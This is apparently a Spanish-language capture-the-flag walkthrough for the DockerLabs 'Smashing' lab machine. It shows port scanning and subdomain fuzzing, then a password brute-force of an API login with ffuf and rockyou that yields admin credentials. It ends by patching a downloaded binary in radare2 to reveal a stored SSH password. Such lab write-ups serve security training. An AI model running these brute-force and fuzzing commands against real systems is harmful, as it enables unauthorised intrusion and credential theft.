---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Smashing DockerLabs (Hard)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip smashing.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh smashing.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-01 03:39 EST
Nmap scan report for gitea.dl (172.17.0.2)
Host is up (0.000048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 8e:f8:76:54:88:0f:c9:04:8c:72:ff:6c:43:57:3e:cb (ECDSA)
|_  256 f9:e7:95:81:58:57:a1:cc:b1:78:96:06:5c:17:1d:ca (ED25519)
80/tcp open  http    Werkzeug/2.2.2 Python/3.11.2
|_http-title: Did not follow redirect to http://cybersec.dl
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Sat, 01 Mar 2025 08:39:38 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 223
|     Location: http://cybersec.dl
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://cybersec.dl">http://cybersec.dl</a>. If not, click the link.
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Sat, 01 Mar 2025 08:39:33 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 223
|     Location: http://cybersec.dl
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://cybersec.dl">http://cybersec.dl</a>. If not, click the link.
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=3/1%Time=67C2C7C5%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1AE,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/2\.2\.2\
SF:x20Python/3\.11\.2\r\nDate:\x20Sat,\x2001\x20Mar\x202025\x2008:39:33\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20223\r\nLocation:\x20http://cybersec\.dl\r\nConnection:\x20close\r\n
SF:\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title>Redirecting\.\.\.</ti
SF:tle>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20should\x20be\x20redirected\
SF:x20automatically\x20to\x20the\x20target\x20URL:\x20<a\x20href=\"http://
SF:cybersec\.dl\">http://cybersec\.dl</a>\.\x20If\x20not,\x20click\x20the\
SF:x20link\.\n")%r(HTTPOptions,1AE,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x
SF:20Werkzeug/2\.2\.2\x20Python/3\.11\.2\r\nDate:\x20Sat,\x2001\x20Mar\x20
SF:2025\x2008:39:33\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8
SF:\r\nContent-Length:\x20223\r\nLocation:\x20http://cybersec\.dl\r\nConne
SF:ction:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title>Re
SF:directing\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20should\x
SF:20be\x20redirected\x20automatically\x20to\x20the\x20target\x20URL:\x20<
SF:a\x20href=\"http://cybersec\.dl\">http://cybersec\.dl</a>\.\x20If\x20no
SF:t,\x20click\x20the\x20link\.\n")%r(RTSPRequest,16C,"<!DOCTYPE\x20HTML>\
SF:n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<
SF:title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\
SF:x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20version\x20\('R
SF:TSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20
SF:explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupport
SF:ed\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n")%r(FourOhFourRe
SF:quest,1AE,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/2\.2\.2\x20
SF:Python/3\.11\.2\r\nDate:\x20Sat,\x2001\x20Mar\x202025\x2008:39:38\x20GM
SF:T\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2
SF:0223\r\nLocation:\x20http://cybersec\.dl\r\nConnection:\x20close\r\n\r\
SF:n<!doctype\x20html>\n<html\x20lang=en>\n<title>Redirecting\.\.\.</title
SF:>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20should\x20be\x20redirected\x20
SF:automatically\x20to\x20the\x20target\x20URL:\x20<a\x20href=\"http://cyb
SF:ersec\.dl\">http://cybersec\.dl</a>\.\x20If\x20not,\x20click\x20the\x20
SF:link\.\n");
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.00 seconds
```

Si intentamos entrar en el puerto `80` veremos que esta bajo un dominio llamado `cybersec.dl`, por lo que lo tendremos que añadir en nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>      cybersec.dl
```

Lo guardamos y ahora si entramos con dicho dominio:

```
URL = http://cybersec.dl/
```

Si inspeccionamos el codigo y nos vamos a donde esta el `JavaScript` veremos la siguiente funcion:

```js
function fetchPassword() {
            fetch('/api/1passwsecu0')
                .then(response => response.json())
                .then(data => {
                    const passwordContainer = document.querySelector('.cybersecurity-animation');
                    passwordContainer.textContent = ` 🔐 Protege tus datos 📁. La Ciberseguridad es Clave! --- Ejemplo de Contraseñas Seguras🔑: ${data.password}`;
                })
                .catch(error => console.error('Error:', error));
        }
```

Por lo que vemos esta utilizando una `API` la cual contiene una contraseña si nos vamos en la siguiente ruta viendo lo siguiente:

```
URL = http://cybersec.dl/api/1passwsecu0
```

Info:

```
password:	")8V.C(|V/(Yq:m~89*iy~>*p"
```

Por lo que vemos parece ser una contraseña de posiblemente algo, pero si volvemos a cargar la pagina veremos que va cambiando la contraseña, vamos a realizar un poco de `fuzzing` en la seccion de la `API`.

## Gobuster

```shell
gobuster dir -u http://cybersec.dl/api -w <WORDLIST> -x html,php,txt -t 100
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cybersec.dl/api
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 405) [Size: 153]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que nos saca un directorio llamado `/login`, pero si entramos desde la web nos dira que no permite ese tipo de conexiones, como sabemos que esta dedicado al `/login` ptobaremos algo asi:

```shell
curl -X POST http://cybersec.dl/api/login \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": "12345"}'
```

Info:

```
{
  "message": "Invalid credentials"
}
```

Por lo que vemos funciona, ahora solo tendremos que descubrir las credenciales de algun usuario valido que este registrado en el sistema.

Antes vamos a realizar tambien un poco de `fuzzing` para ver si encontramos algun `subdominio`.

## FFUF

```shell
ffuf -c -w <WORDLIST> -u http://cybersec.dl -H "Host: FUZZ.cybersec.dl" -fs 223
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cybersec.dl
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Header           : Host: FUZZ.cybersec.dl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 223
________________________________________________

mail                    [Status: 200, Size: 2909, Words: 645, Lines: 116, Duration: 62ms]
:: Progress: [20469/20469] :: Job [1/1] :: 564 req/sec :: Duration: [0:00:33] :: Errors: 0 ::
```

Vemos que obtuvimos uno llamado `mail`, por lo que vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>      cybersec.dl mail.cybersec.dl
```

Lo guardamos y nos metemos con dicho `subdominio`.

!\[\[Pasted image 20250301103755.png]]

Veremos un `login`, pero no vemos que se pueda hacer mucho, si volvemos e intentamos realizar fuerza bruta con el usuario `admin` en la parte de `/api/login` de la siguiente forma:

## FFUF

```shell
ffuf -u http://cybersec.dl/api/login -X POST -H "Content-Type: application/json" -d '{"username": "admin", "password": "FUZZ"}' -w <WORDLIST> -fs 39
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://cybersec.dl/api/login
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"username": "admin", "password": "FUZZ"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 39
________________________________________________

undertaker              [Status: 200, Size: 650, Words: 76, Lines: 13, Duration: 50ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Veremos que sacamos las credenciales del usuario `admin`, ahora vamos a ver que informacion contiene de la siguiente forma:

```shell
curl -X POST http://cybersec.dl/api/login \ 
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": "undertaker"}'
```

Info:

```
{
  "company": {
    "URLs_web": "cybersec.dl, bin.cybersec.dl, mail.cybersec.dl, dev.cybersec.dl, cybersec.dl/downloads, internal-api.cybersec.dl, 0internal_down.cybersec.dl, internal.cybersec.dl, cybersec.dl/documents, cybersec.dl/api/cpu, cybersec.dl/api/login",
    "address": "New York, EEUU",
    "branches": "Brazil, Curacao, Lithuania, Luxembourg, Japan, Finland",
    "customers": "ADIDAS, COCACOLA, PEPSICO, Teltonika, Toray Industries, Weg, CURALINk",
    "name": "CyberSec Corp",
    "phone": "+1322302450134200",
    "services": "Auditorias de seguridad, Pentesting, Consultoria en ciberseguridad"
  },
  "message": "Login successful"
}
```

Vemos que hay varios `subdominios` con rutas, probando todas, la unica que me funciono a parte de `mail` es la de `0internal_down.cybersec.dl`, por lo que lo añadiremos al `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>      cybersec.dl mail.cybersec.dl 0internal_down.cybersec.dl
```

Lo guardamos y entramos con dicho `subdominio` veremos lo siguiente:

```
URL = http://0internal_down.cybersec.dl
```

!\[\[Pasted image 20250301122941.png]]

Vemos que podemos descargarnos lo que parece ser un `binario` y una nota `.txt`, vamos a descargarnos las `2` cosas.

La nota dice lo siguiente:

```
De: flypsi
Para: Darksblack

Darksblack, necesito que me ayudes a recuperar mi password, te deje un binario para que lo analises y la extraigas, habia dejado mi password incorporada en el para
un CTF que estaba realizando pero perdi mis apuntes... (sisisisi ya se que me has dicho que no reutilice password, pero se me olvidan)
```

Si intentamos ejecutar la aplicacion veremos que nos indica un nombre y despues nos hace un pregunta, se ve una aplicacion normal, pero si desbordamos la `pila` de la aplicacion de esta forma:

```shell
./smashing
```

Info:

```
Bienvenido al programa interactivo.
Introduce tu nombre: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hola, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
*** stack smashing detected ***: terminated
zsh: IOT instruction  ./smashing
```

Indica que el programa ha experimentado una **violación de integridad de pila (stack smashing)**, lo cual ocurre cuando el programa intenta escribir más allá de la memoria que le ha sido asignada, corrompiendo así el espacio de pila.

Pero vemos que es muy complicado, ya que me tire bastante rato intentandolo, por lo que vamos a modificar los `bytes` del binario con la herramienta `ghidra` para llamar a una funcion que encontre bastante interesante que se llama `factor1` y contiene lo siguiente:

```c
void factor1(void)

{
  long in_FS_OFFSET;
  undefined8 local_118;
  undefined8 local_110;
  undefined8 local_108;
  undefined8 local_100;
  undefined8 local_f8;
  undefined8 local_f0;
  undefined8 local_e8;
  undefined8 local_e0;
  undefined8 local_d8;
  undefined8 local_d0;
  undefined8 local_c8;
  undefined8 local_c0;
  undefined8 local_b8;
  undefined8 local_b0;
  undefined8 local_a8;
  undefined8 local_a0;
  undefined8 local_98;
  undefined8 local_90;
  undefined8 local_88;
  undefined8 local_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_118 = 0;
  local_110 = 0;
  local_108 = 0;
  local_100 = 0;
  local_f8 = 0;
  local_f0 = 0;
  local_e8 = 0;
  local_e0 = 0;
  local_d8 = 0;
  local_d0 = 0;
  local_c8 = 0;
  local_c0 = 0;
  local_b8 = 0;
  local_b0 = 0;
  local_a8 = 0;
  local_a0 = 0;
  local_98 = 0;
  local_90 = 0;
  local_88 = 0;
  local_80 = 0;
  local_78 = 0;
  local_70 = 0;
  local_68 = 0;
  local_60 = 0;
  local_58 = 0;
  local_50 = 0;
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  strcat((char *)&local_118,a1209);
  strcat((char *)&local_118,b1210);
  strcat((char *)&local_118,c1211);
  strcat((char *)&local_118,d1212);
  strcat((char *)&local_118,e1213);
  strcat((char *)&local_118,f1214);
  strcat((char *)&local_118,g1215);
  printf("info: %s\n",&local_118);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Donde pone `info:` veremos que muestra la informacion que queremos saber, desde el codigo no podremos ver cual es esa informacion, pero lo que si podremos hacer es irnos a la funcion `main` que es donde se aloja el programa de forma principal y desde hay llamar a dicha funcion para que nos muestre la informacion, por eso tendremos que cambiar algunos `bytes` del programa para `re-compilarlo` y ejecutarlo, es una tarea bastante tediosa.

La funcion `main` es esta en `C#`:

```c
/* WARNING: Removing unreachable block (ram,0x0010245c) */
/* WARNING: Removing unreachable block (ram,0x001024c7) */
/* WARNING: Removing unreachable block (ram,0x001024a7) */
/* WARNING: Removing unreachable block (ram,0x001024cf) */

undefined8 main(void)

{
  int iVar1;
  long in_FS_OFFSET;
  char local_14 [4];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Bienvenido al programa interactivo.");
  factor2();
  printf(&DAT_00103678);
  __isoc99_scanf(&DAT_001036c0,local_14);
  iVar1 = strcmp(local_14,"si");
  if (iVar1 == 0) {
    interesting_facts();
    imprimir_medidas_ciberseguridad();
  }
  else {
    puts(&DAT_001036c8);
  }
  putchar(10);
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

Ahora tendremos que darle a este boton de aqui llendonos a la funcion `main` y probaremos a cambiar algunos `bytes` para que un texto diga otra cosa de lo que normalmente dice, en vez de que diga `Bienvenido al programa interactivo.` reemplazarlo por `Programa modificado by d1se0.`.

!\[\[Pasted image 20250303121113.png]]

Dandole a ese boton, se nos abrira la cadena de `bytes` que corresponde en la posicion de donde tengamos el programa, por lo que pincharemos donde pone la frase y nos marcara la cadena de `bytes`, una vez echo eso, pasaremos el texto de `ascii` a `bytes` con la siguiente pagina:

URL = [ascii to bytes Page](https://onlinetools.com/ascii/convert-ascii-to-bytes)

Tendremos dentro del panel de `bytes` que darle al siguiente boton para empezar a modificar el bloque:

!\[\[Pasted image 20250303121411.png]]

Y lo modificaremos...

!\[\[Pasted image 20250303120755.png]]

Una vez modificados los `bytes`, le daremos al siguiente boton para guardar la modificacion.

!\[\[Pasted image 20250303120819.png]]

Una vez que lo hayamos guardado se habran modificado los `bytes` por lo que el texto tambien se habra modificado, tendremos que `re-compilarlo` llendonos a `File`:

!\[\[Pasted image 20250303121737.png]]

De esta seccion, seleccionamos `Export Program...`:

!\[\[Pasted image 20250303121811.png]]

En el formato lo dejamos como `Original File` para que sea el binario y se pueda ejecutar, y el `PATH` donde queremos que lo deje, una vez echo todo esto, le daremos a `Ok` y con esto ya tendremos el binario modificado.

Vamos a probar a ejecutarlo:

```shell
chmod +x ./smashing1
./smashing1
```

Info:

```
Programa modificado by d1se0.
Introduce tu nombre: test
Hola, test

¿Te gustaría saber datos interesantes sobre ciberseguridad? (si/no): no
Gracias por usar el programa. Adiós!
```

Vemos que ha funcionado, ahora vamos a modificar los `bytes` de lo que realmente queremos hacer, que sera llamar a la funcion `factor1` para ver que obtenemos de informacion.

Pero es demasiado complejo para realizarlo en `Ghidra`, por lo que vamos a utilizar la herramienta `radare2`.

## Modificación de binario con radare2

Vamos a ejecutar `radare2` en modo `escritura` para poder escribir en las direcciones de memoria la funcion que queremos que llame.

```shell
radare2 -A -w smashing1
```

Vamos a cargar el `binario` que modificamos con `ghidra`, una vez que estemos dentro del binario con `radare2`, vamos a identificar donde esta la direccion de memoria a la que se esta llamando la funcion `factor2`:

```shell
pdf @ main
```

Info:

```c
           ; DATA XREF from entry0 @ 0x11e4(r)
┌ 325: int main (int argc, char **argv, char **envp);
│           ; var int64_t canary @ rbp-0x8
│           ; var char *s1 @ rbp-0xc
│           ; var char *var_18h @ rbp-0x18
│           ; var char *var_20h @ rbp-0x20
│           ; var char *var_28h @ rbp-0x28
│           ; var char *var_30h @ rbp-0x30
│           ; var char *var_38h @ rbp-0x38
│           ; var char *var_40h @ rbp-0x40
│           ; var uint32_t var_44h @ rbp-0x44
│           ; var int64_t var_48h @ rbp-0x48
│           0x000023b1      55             push rbp
│           0x000023b2      4889e5         mov rbp, rsp
│           0x000023b5      4883ec50       sub rsp, 0x50
│           0x000023b9      64488b0425..   mov rax, qword fs:[0x28]
│           0x000023c2      488945f8       mov qword [canary], rax
│           0x000023c6      31c0           xor eax, eax
│           0x000023c8      488d058112..   lea rax, str.Programa_modificado_by_d1se0. ; 0x3650 ; "Programa modificado by d1se0."
│           0x000023cf      4889c7         mov rdi, rax                ; const char *s
│           0x000023d2      e879edffff     call sym.imp.puts           ; int puts(const char *s)
│           0x000023d7      b800000000     mov eax, 0
│           0x000023dc      e8fafeffff     call sym.factor2
│           0x000023e1      488d059012..   lea rax, str.Te_gustara_saber_datos_interesantes_sobre_ciberseguridad___si_no_: ; 0x3678
│           0x000023e8      4889c7         mov rdi, rax                ; const char *format
│           0x000023eb      b800000000     mov eax, 0
│           0x000023f0      e83becffff     call sym.imp.printf         ; int printf(const char *format)
│           0x000023f5      488d45f4       lea rax, [s1]
│           0x000023f9      4889c6         mov rsi, rax
│           0x000023fc      488d05bd12..   lea rax, [0x000036c0]       ; "%3s"
│           0x00002403      4889c7         mov rdi, rax                ; const char *format
│           0x00002406      b800000000     mov eax, 0
│           0x0000240b      e8f0ecffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x00002410      488d45f4       lea rax, [s1]
│           0x00002414      488d15a912..   lea rdx, [0x000036c4]       ; "si"
│           0x0000241b      4889d6         mov rsi, rdx                ; const char *s2
│           0x0000241e      4889c7         mov rdi, rax                ; const char *s1
│           0x00002421      e81aedffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
│           0x00002426      85c0           test eax, eax
│       ┌─< 0x00002428      7516           jne 0x2440
│       │   0x0000242a      b800000000     mov eax, 0
│       │   0x0000242f      e81cffffff     call sym.interesting_facts
│       │   0x00002434      b800000000     mov eax, 0
│       │   0x00002439      e854f4ffff     call sym.imprimir_medidas_ciberseguridad
│      ┌──< 0x0000243e      eb0f           jmp 0x244f
│      ││   ; CODE XREF from main @ 0x2428(x)
│      │└─> 0x00002440      488d058112..   lea rax, str.Gracias_por_usar_el_programa._Adis_ ; 0x36c8 ; "Gracias por usar el programa. Adi\u00f3s!"
│      │    0x00002447      4889c7         mov rdi, rax                ; const char *s
│      │    0x0000244a      e801edffff     call sym.imp.puts           ; int puts(const char *s)
│      │    ; CODE XREF from main @ 0x243e(x)
│      └──> 0x0000244f      c745bc4600..   mov dword [var_44h], 0x46   ; 'F'
│           0x00002456      837dbc4e       cmp dword [var_44h], 0x4e   ; 'N'
│       ┌─< 0x0000245a      7575           jne 0x24d1
│       │   0x0000245c      488d058b12..   lea rax, str.salomon89014max ; 0x36ee ; "salomon89014max"
│       │   0x00002463      488945c0       mov qword [var_40h], rax
│       │   0x00002467      488d059012..   lea rax, str.miralla400tock6 ; 0x36fe ; "miralla400tock6"
│       │   0x0000246e      488945c8       mov qword [var_38h], rax
│       │   0x00002472      488d059512..   lea rax, str.45678fbichacuviii ; 0x370e ; "45678fbichacuviii"
│       │   0x00002479      488945d0       mov qword [var_30h], rax
│       │   0x0000247d      488d059c12..   lea rax, str.pepinillochingon ; 0x3720 ; "pepinillochingon"
│       │   0x00002484      488945d8       mov qword [var_28h], rax
│       │   0x00002488      488d05a212..   lea rax, str.chocolate3000  ; 0x3731 ; "chocolate3000"
│       │   0x0000248f      488945e0       mov qword [var_20h], rax
│       │   0x00002493      488d05a512..   lea rax, str.balulero       ; 0x373f ; "balulero"
│       │   0x0000249a      488945e8       mov qword [var_18h], rax
│       │   0x0000249e      c745b80000..   mov dword [var_48h], 0
│      ┌──< 0x000024a5      eb20           jmp 0x24c7
│      ││   ; CODE XREF from main @ 0x24cd(x)
│     ┌───> 0x000024a7      8b45b8         mov eax, dword [var_48h]
│     ╎││   0x000024aa      4898           cdqe
│     ╎││   0x000024ac      488b44c5c0     mov rax, qword [rbp + rax*8 - 0x40]
│     ╎││   0x000024b1      4889c7         mov rdi, rax                ; int64_t arg1
│     ╎││   0x000024b4      e84eefffff     call sym.process_string
│     ╎││   0x000024b9      bf0a000000     mov edi, 0xa                ; int c
│     ╎││   0x000024be      e86decffff     call sym.imp.putchar        ; int putchar(int c)
│     ╎││   0x000024c3      8345b801       add dword [var_48h], 1
│     ╎││   ; CODE XREF from main @ 0x24a5(x)
│     ╎└──> 0x000024c7      8b45b8         mov eax, dword [var_48h]
│     ╎ │   0x000024ca      83f805         cmp eax, 5
│     └───< 0x000024cd      76d8           jbe 0x24a7
│      ┌──< 0x000024cf      eb0a           jmp 0x24db
│      ││   ; CODE XREF from main @ 0x245a(x)
│      │└─> 0x000024d1      bf0a000000     mov edi, 0xa                ; int c
│      │    0x000024d6      e855ecffff     call sym.imp.putchar        ; int putchar(int c)
│      │    ; CODE XREF from main @ 0x24cf(x)
│      └──> 0x000024db      b800000000     mov eax, 0
│           0x000024e0      488b55f8       mov rdx, qword [canary]
│           0x000024e4      64482b1425..   sub rdx, qword fs:[0x28]
│       ┌─< 0x000024ed      7405           je 0x24f4
│       │   0x000024ef      e8fcebffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
│       │   ; CODE XREF from main @ 0x24ed(x)
│       └─> 0x000024f4      c9             leave
└           0x000024f5      c3             ret
```

Vemos esta parte de aqui que es la que queremos modificar:

```
0x000023dc      e8fafeffff     call sym.factor2
```

Y corresponde con `0x000023dc` por lo que vamos a modificar ese `sym.factor2` por `sym.factor1`, pero antes tendremos que saber la direccion de memoria de `factor1`:

```shell
pdf @ sym.factor1
```

Info:

```c
........................<RESTO_CODIGO>...................................
0x000022ad      4889c6         mov rsi, rax
│           0x000022b0      488d058c11..   lea rax, str.info:__s_n     ; 0x3443 ; "info: %s\n"
│           0x000022b7      4889c7         mov rdi, rax                ; const char *format
│           0x000022ba      b800000000     mov eax, 0
│           0x000022bf      e86cedffff     call sym.imp.printf         ; int printf(const char *format)
│           0x000022c4      90             nop
│           0x000022c5      488b45f8       mov rax, qword [canary]
│           0x000022c9      64482b0425..   sub rax, qword fs:[0x28]
│       ┌─< 0x000022d2      7405           je 0x22d9
│       │   0x000022d4      e817eeffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
│       │   ; CODE XREF from sym.factor1 @ 0x22d2(x)
│       └─> 0x000022d9      c9             leave
└           0x000022da      c3             ret
```

Aqui vemos esta parte:

```
CODE XREF from sym.factor1 @ 0x22d2(x)
```

Por lo que vemos corresponde `sym.factor1` con `0x22d2`, teniendo todo esto, ya podremos realizar el calculo de los `bytes` que tendremos que poner en la direccion que comente antes para poder llamar a `sym.factor1`.

#### **Calcular el desplazamiento relativo**

La instrucción `call` usa una dirección **relativa** y se calcula así:

!\[\[Pasted image 20250303134109.png]]

Sabemos que:

* `factor1` = **0x000020a7**
* `call` en `0x000023dc`

!\[\[Pasted image 20250303134123.png]]

Convertimos `-0x33A` a **little-endian** en 4 bytes:

!\[\[Pasted image 20250303134139.png]]

Si tambien contamos con el `opcode` del `CALL` que es `e8` nos quedaria algo asi:

```
e8 c6 fc ff ff
```

Por lo que tendremos que sobreescribirlo de la siguiente forma:

```shell
s 0x000023dc #Cambiar a la direccion de memoria
wx e8 c6 fc ff ff @ 0x000023dc #Sobreescribir la direccion con sym.factor1
wq #Para guardar los cambios
pd 5 #Visualizar los cambios
```

Info:

```c
│           0x000023dc      e8c6fcffff     call sym.factor1
│       ┌─< 0x000023e1      7231           jb 0x2414
│       │   0x000023e3      0590120000     add eax, 0x1290
│       │   0x000023e8      4889c7         mov rdi, rax                ; const char *format
│       │   0x000023eb      b800000000     mov eax, 0
```

Vemos que efectivamente se modifico de forma correcta, por lo que si nos salimos poniendo `q` y ejecutamos el binario:

```shell
./smashing1
```

Info:

```
Programa modificado by d1se0.
info: 2tP42bSzBTnmEAuAGkxj3
zsh: segmentation fault  ./smashing1
```

Vemos que ha funcionado y nos devuelve la informacion por lo que se ve de forma codificada, vamos a intentar decodificarlo.

> NOTA:

Os dejo el binario modificado en el siguiente link:

URL = [Binario modificado](https://drive.google.com/file/d/1HYBVReq6PAmm-riKWJB8nF6QsLrjzdkI/view?usp=sharing)

Veremos que esta en `Base58`, si lo decodificamos veremos lo sguiente:

```
Chocolate.1704
```

Obtuvimos lo que parece ser una contraseña, ahora la tendremos que probar a conectarnos por `SSH` como el usuario `flypsi`.

